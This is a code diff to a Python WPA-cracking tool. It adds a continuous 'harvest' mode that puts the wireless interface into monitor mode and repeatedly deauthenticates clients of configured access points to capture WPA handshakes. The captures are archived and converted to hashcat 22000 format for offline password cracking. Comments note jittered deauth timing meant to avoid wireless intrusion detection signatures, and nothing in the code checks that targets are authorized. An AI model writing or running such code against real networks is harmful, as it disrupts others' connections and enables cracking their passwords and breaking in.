@@ -41,6 +41,11 @@ DEAUTH_JITTER      = 8    # +/- seconds, so the timing has no periodic WIDS sign
 PASSIVE_FIRST      = 25   # seconds of pure passive listen before ANY deauth (a natural join is free)
 FRAMES_PER_ROUND   = 64   # aireplay constant, for the status frame-estimate only
 
+# --- harvest (continuous library) mode ---
+LIBRARY     = "/opt/wpacrack/library"  # from conf: library - where harvested handshakes accumulate
+COOLDOWN    = 1800                     # from conf: cooldown - seconds to idle between capture cycles
+REFRESH_TTL = 86400                    # from conf: refresh_ttl - skip a BSSID with a handshake newer than this
+
 WORK   = "/opt/wpacrack"
 CAPS   = WORK + "/caps"
 STATUS = WORK + "/STATUS.txt"
@@ -89,6 +94,13 @@ def load_config():
                 tgs.append((bssid.upper(), int(ch)))
     TARGETS = tgs
     CUSTOM_SEEDS = [w.strip() for w in cfg.get("custom_seeds", "").split(",") if w.strip()]
+    global LIBRARY, COOLDOWN, REFRESH_TTL
+    LIBRARY = cfg.get("library", LIBRARY)
+    try:
+        COOLDOWN = int(cfg.get("cooldown", COOLDOWN))
+        REFRESH_TTL = int(cfg.get("refresh_ttl", REFRESH_TTL))
+    except ValueError:
+        pass
     if not TARGETS:
         sys.stderr.write("FATAL: wpacrack.conf has no valid 'targets = BSSID:CH,...' - refusing to run.\n")
         sys.exit(2)
@@ -350,6 +362,78 @@ def convert_22000(bssid):
     return made
 
 
+# ---------------- harvest (continuous library) ----------------
+def have_recent(bssid, ttl):
+    """True if the library already holds a handshake for this BSSID newer than ttl seconds."""
+    d = os.path.join(LIBRARY, bssid.replace(":", ""))
+    if not os.path.isdir(d):
+        return False
+    newest = 0
+    for f in os.listdir(d):
+        if f.endswith(".cap"):
+            try:
+                newest = max(newest, os.path.getmtime(os.path.join(d, f)))
+            except OSError:
+                pass
+    return newest and (time.time() - newest) < ttl
+
+
+def archive(bssid):
+    """Copy the freshly captured handshake into the library under <BSSID>/<timestamp>.{cap,22000}
+    and append to the library index. Conversion to 22000 is best-effort (hcxpcapngtool)."""
+    d = os.path.join(LIBRARY, bssid.replace(":", ""))
+    os.makedirs(d, exist_ok=True)
+    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
+    dst_cap = os.path.join(d, ts + ".cap")
+    run(["cp", GOOD, dst_cap])
+    made = ""
+    w = run(["which", "hcxpcapngtool"])
+    if w is not None and getattr(w, "returncode", 1) == 0:
+        dst_22 = os.path.join(d, ts + ".22000")
+        run(["hcxpcapngtool", "-o", dst_22, dst_cap], timeout=120)
+        if os.path.exists(dst_22) and os.path.getsize(dst_22) > 0:
+            made = dst_22
+    try:
+        with open(os.path.join(LIBRARY, "index.csv"), "a") as f:
+            f.write(f"{ts},{bssid},{ESSID},{dst_cap},{made}\n")
+    except Exception:
+        pass
+    log(f"archived {bssid} -> {dst_cap}" + (f" (+{os.path.basename(made)})" if made else ""))
+    return dst_cap
+
+
+def harvest_loop():
+    """Continuous capture: set monitor mode ONCE (no per-cycle NetworkManager churn - that was the
+    cause of an earlier lockup), then repeatedly capture handshakes for the authorized targets and
+    archive them into the library. Idles COOLDOWN between cycles, and longer when every target
+    already has a handshake newer than REFRESH_TTL. Restores the box once, on stop."""
+    os.makedirs(LIBRARY, exist_ok=True)
+    set_state("harvest-init", f"monitor mode; library={LIBRARY}")
+    netwatch("off")
+    stop_nm()
+    set_monitor()
+    cyc = 0
+    while True:
+        cyc += 1
+        stale = [b for b, _ in TARGETS if not have_recent(b, REFRESH_TTL)]
+        if not stale:
+            set_state("harvest-idle", f"cycle {cyc}: all {len(TARGETS)} targets fresh; idling {COOLDOWN*4}s")
+            time.sleep(COOLDOWN * 4)
+            continue
+        global _deauth_rounds
+        _deauth_rounds = 0          # each cycle gets its own gentle, capped deauth budget
+        set_state("harvest", f"cycle {cyc}: hunting {len(stale)} stale target(s)")
+        bssid = capture()            # reuses the lockout-safe capture(); does NOT touch NM
+        if bssid:
+            archive(bssid)
+            n = sum(len(os.listdir(os.path.join(LIBRARY, d))) for d in os.listdir(LIBRARY)
+                    if os.path.isdir(os.path.join(LIBRARY, d)))
+            set_state("harvest", f"cycle {cyc}: captured {bssid}; library now ~{n} files; cooldown {COOLDOWN}s")
+        else:
+            set_state("harvest", f"cycle {cyc}: no handshake this pass; cooldown {COOLDOWN}s")
+        time.sleep(COOLDOWN)
+
+
 # ---------------- cleanup / signals ----------------
 def cleanup():
     """Always restore the box to a clean managed state: managed iface, NetworkManager up,
@@ -387,6 +471,15 @@ def main():
         open(RESULT, "w").close()
     except Exception:
         pass
+    # continuous harvest mode: capture into a library forever (Ctrl-C / SIGTERM restores the box)
+    if "--harvest" in sys.argv:
+        try:
+            harvest_loop()
+        except Exception:
+            tb = traceback.format_exc(); log("HARVEST FATAL:\n" + tb)
+            cleanup(); write_result("HARVEST ERROR - see wpacrack.log", tb[-800:])
+        return
+
     set_state("init", "preflight + monitor mode")
     gen_candidates()
     netwatch("off")
